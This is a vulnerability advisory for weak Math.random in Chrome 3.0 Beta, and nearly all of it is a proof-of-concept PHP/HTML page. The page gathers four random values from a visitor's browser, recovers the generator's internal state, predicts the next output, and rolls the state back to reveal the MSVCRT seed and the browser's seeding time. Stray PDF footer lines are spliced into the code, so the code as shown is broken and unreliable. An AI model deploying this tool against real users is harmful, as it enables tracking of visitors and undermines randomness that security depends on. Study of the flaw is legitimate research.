source: http://www.securityfocus.com/bid/36185/info

Google Chrome is prone to security vulnerability that may allow the application to generate weak random numbers.

Successfully exploiting this issue may allow attackers to obtain sensitive information or gain unauthorized access.

Chrome 3.0 Beta is vulnerable; other versions may also be affected.

<?php
define("MAX_JS_MILEAGE",10000);
$two_31=bcpow(2,31);
$two_32=bcpow(2,32);
function adv($x)
{
global $two_31;
return bcmod(bcadd(bcmul(214013,$x),"2531011"),$two_31);
}
function prev_state($state)
{
global $two_31;
// 968044885 * 214013 - 192946 * 1073741824 = 1
$state=bcmod(bcsub(bcadd($state,$two_31),"2531011"),$two_31);
$state=bcmod(bcmul("968044885",$state),$two_31);
return $state;
}
if ($_REQUEST['r1'])
{
$v1=$_REQUEST['r1'];
$v2=$_REQUEST['r2'];
$v3=$_REQUEST['r3'];
$v4=$_REQUEST['r4'];
$t=$_REQUEST['t'];
$lo1low=$v1 & 0xFFFF;
$lo2low=$v2 & 0xFFFF;
$lo1high=bcmod(bcsub(bcadd($two_32,$lo2low),bcmul(18273,$lo1low)),65536);
$lo1=bcadd(bcmul($lo1high,65536),$lo1low);
$lo2=bcadd(bcmul(18273,bcmod($lo1,65536)),bcdiv($lo1,65536,0));
$lo3=bcadd(bcmul(18273,bcmod($lo2,65536)),bcdiv($lo2,65536,0));
$lo4=bcadd(bcmul(18273,bcmod($lo3,65536)),bcdiv($lo3,65536,0));
$found_state=false;
for ($unk=0;$unk<16;$unk++)
{
$hi1low=($v1 >> 16)|(($unk & 3)<<14);
$hi2low=($v2 >> 16)|(($unk>>2)<<14);
$hi1high=bcmod(bcsub(bcadd($two_32,$hi2low),bcmul(36969,$hi1low)),65536);
if ($hi1high>=36969)
{
continue;
}
$hi1=bcadd(bcmul($hi1high,65536),$hi1low)+0;
$hi2=bcadd(bcmul(36969,($hi1 & 0xFFFF)),bcdiv($hi1,65536,0))+0;
$hi3=bcadd(bcmul(36969,($hi2 & 0xFFFF)),bcdiv($hi2,65536,0))+0;
$hi4=bcadd(bcmul(36969,($hi3 & 0xFFFF)),bcdiv($hi3,65536,0))+0;
if (($v1 == ((($hi1<<16)|($lo1 & 0xFFFF))&0x3FFFFFFF)) and
($v2 == ((($hi2<<16)|($lo2 & 0xFFFF))&0x3FFFFFFF)) and
Google Chrome v3.0 (Beta) Math.random vulnerability
10
($v3 == ((($hi3<<16)|($lo3 & 0xFFFF))&0x3FFFFFFF)) and
($v4 == ((($hi4<<16)|($lo4 & 0xFFFF))&0x3FFFFFFF)))
{
$found_state=true;
break;
}
}
if (!$found_state)
{
echo "ERROR: cannot find PRNG state (is this really Chrome 3.0?)
<br>\n";
exit;
}
echo "Math.random PRNG current state: hi=$hi4 lo=$lo4 <br>\n";
$lo5=bcadd(bcmul(18273,bcmod($lo4,65536)),bcdiv($lo4,65536,0));
$hi5=bcadd(bcmul(36969,($hi4 & 0xFFFF)),bcdiv($hi4,65536,0))+0;
$v5=(($hi5<<16)|($lo5 & 0xFFFF))&0x3FFFFFFF;
echo "Math.random next value:
<script>document.write($v5/Math.pow(2,30));</script> <br>\n";
echo " <br>\n";
echo "NOTE: Anything below this line is available only for Windows. <br>\n";
echo " <br>\n";
# Rollback
$lo=$lo1;
$hi=$hi1;
$found_initial_state=false;
for ($mileage=0;$mileage<MAX_JS_MILEAGE;$mileage++)
{
$lo_prev_low=bcdiv($lo,18273,0);
$lo_prev_high=bcmod($lo,18273);
$lo=bcadd(bcmul($lo_prev_high,65536),$lo_prev_low);
$hi_prev_low=bcdiv($hi,36969,0);
$hi_prev_high=bcmod($hi,36969);
$hi=bcadd(bcmul($hi_prev_high,65536),$hi_prev_low);
if ((bcdiv($hi,32768,0)==0) and (bcdiv($lo,32768,0)==0))
{
echo "Math.random PRNG initial state: hi=$hi lo=$lo <br>\n";
echo "Math.random PRNG mileage: $mileage [Math.random()
invocations] <br>\n";
$found_initial_state=true;
break;
}
}
if ($found_initial_state)
{
echo "<br>";
$first=$hi+0;
$second=$lo+0;
$cand=array();
for ($v=0;$v<(1<<16);$v++)
{
$state=($first<<16)|$v;
$state=adv($state);
if ((($state>>16)&0x7FFF)==$second)
{
$state=prev_state(($first<<16)|$v);
$seed_time=bcadd(bcmul(bcdiv(bcmul($t,1000),$two_31,0),$two_31),$state);
if (bccomp($seed_time,bcmul($t,1000))==1)
{
$seed_time=bcsub($seed_time,$two_31);
}
$cand[$seed_time]=$state;
}
}
Google Chrome v3.0 (Beta) Math.random vulnerability
11
# reverse sort by seed_time key (string comparison - but since 2002,
second-since-Epoch are 10 digits exactly, so string comparison=numeric comparison)
krsort($cand);
echo count($cand)." candidate(s) for MSVCRT seed and seeding time, from
most likely to least likely: <br>\n";
echo "<code>\n";
echo "<table>\n";
echo "<tr>\n";
echo " <td><b>MSVCRT PRNG Seeding time [sec]&nbsp;</b></td>\n";
echo " <td><b>MSVCRT PRNG Seeding time [UTC date]&nbsp;</b></td>";
echo " <td><b>MSVCRT PRNG seed</b></td>\n";
echo "</tr>\n";
$cn=0;
foreach ($cand as $seed_time => $st)
{
if ($cn==0)
{
$pre="<u>";
$post="</u>";
}
else
{
$pre="<i>";
$post="</i>";
}
echo "<tr>\n";
echo " <td>".$pre.substr_replace($seed_time,".",-
3,0).$post."</td>\n";
echo "
<td>".$pre.gmdate("r",bcdiv($seed_time,1000)).$post."</td>\n";
echo " <td>".$pre.$st.$post."</td>\n";
echo "</tr>\n";
$cn++;
}
echo "</table>\n";
echo "</code>\n";
echo " <br>\n";
}
else
{
echo "ERROR: Cannot find Math.random initial state (non-Windows
platform?) <br>\n";
}
}
?>
<html>
<body>
<form method="POST" onSubmit="f()">
<input type="hidden" name="r1">
<input type="hidden" name="r2">
<input type="hidden" name="r3">
<input type="hidden" name="r4">
<input type="hidden" name="t">
<input type="submit" name="dummy" value="Calculate Chrome 3.0 (Windows) Math.random
PRNG state, mileage and MSVCRT seed and seeding time">
</form>
<script>
function f()
{
document.forms[0].r1.value=Math.random()*Math.pow(2,30);
document.forms[0].r2.value=Math.random()*Math.pow(2,30);
document.forms[0].r3.value=Math.random()*Math.pow(2,30);
document.forms[0].r4.value=Math.random()*Math.pow(2,30);
document.forms[0].t.value=(new Date()).getTime()/1000;
return true;
}
</script>
<form onSubmit="alert(Math.random());return false;">
<input type="submit" name="dummy" value="Sample Math.random()">
</form>